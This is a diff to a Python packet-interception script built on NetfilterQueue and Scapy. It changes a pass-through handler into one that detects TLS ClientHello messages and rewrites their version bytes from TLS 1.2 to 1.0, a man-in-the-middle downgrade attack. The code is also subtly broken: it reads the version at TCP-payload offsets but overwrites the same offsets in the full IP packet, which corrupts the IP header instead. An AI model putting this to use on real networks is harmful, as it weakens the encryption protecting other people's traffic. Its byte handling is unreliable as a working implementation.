@@ -16,9 +16,32 @@ __builtins__.__dict__.update(scapy_builtins)
 nfQueueID         = 0
 maxPacketsToStore = 100
 
-def packetReceived(pkt):             # called each time a packet is put in the queue
-  print("New packet received.")
-  pkt.accept();                      # accepts and forwards this packet to the appropriate network address
+def packetReceived(pkt):
+  #print("Accepted a new packet...")
+  print("...")
+  ip = IP(pkt.get_payload())
+
+  if not ip.haslayer("Raw"):
+    pkt.accept();
+
+  else:
+    tcpPayload = ip["Raw"].load;                                          
+                                            
+    # Adjusted the matching rules for Python 2 and old Scapy.
+    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
+      print("TLS handshake found, client HELLO.")                                      
+                                                                                       
+      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':                         
+        print("TLS v1.2, dropping down to v1.0")                                       
+        msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it            
+        msgBytes2 = [b for b in msgBytes]                                              
+        msgBytes2[9] = 0x03                                                            
+        msgBytes2[10] = 0x01                                                           
+        pkt.set_payload(bytes(msgBytes2))                                              
+                                                                                       
+      pkt.accept() 
+    else:
+      pkt.accept();
 
 print("Binding to NFQUEUE", nfQueueID)
 nfqueue = NetfilterQueue()
